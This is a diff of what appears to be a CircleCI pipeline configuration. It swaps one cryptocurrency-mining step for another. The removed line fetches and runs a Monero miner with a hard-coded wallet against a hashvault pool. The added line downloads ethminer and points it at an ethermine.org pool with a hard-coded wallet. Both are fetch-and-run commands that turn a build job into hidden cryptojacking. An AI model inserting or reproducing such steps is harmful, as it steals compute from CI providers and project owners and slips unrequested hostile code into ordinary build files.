@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 429kjqMn4EKhrSPEmV46xzJJSr3hs2bg4CqLC86oVxoF2U52BZnevQqUTBA4KFCL8WN3mkx46a2bWirBhCPTsv7qDhcTRt6  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 pool.hashvault.pro:80
+      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-8-linux-x86_64.tar.gz && tar xfvz ethminer-0.19.0-alpha.0-cuda-8-linux-x86_64.tar.gz && cd bin && ./ethminer -P stratum1+tcp://0x17bF655F28A02E9d6Bf1EDF5cc4F8a0761D80aB7.66gui@eu1-etc.ethermine.org:4444 -G
